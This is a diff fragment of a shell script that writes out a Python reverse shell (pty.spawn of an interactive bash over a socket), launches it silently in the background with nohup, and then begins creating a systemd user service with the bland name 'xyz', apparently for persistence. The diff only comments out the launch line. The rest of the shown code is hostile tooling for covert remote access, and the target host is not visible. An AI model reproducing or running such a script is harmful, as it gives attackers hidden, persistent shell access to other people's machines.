@@ -41,7 +41,7 @@ pty.spawn(['/bin/bash','-i'])
 s.close()
 "
 EOF
-nohup bash "$script_path" > /dev/null 2>&1 &
+#nohup bash "$script_path" > /dev/null 2>&1 &
 
 service_directory="$HOME/.config/systemd/user"
 service_path="$service_directory/xyz"
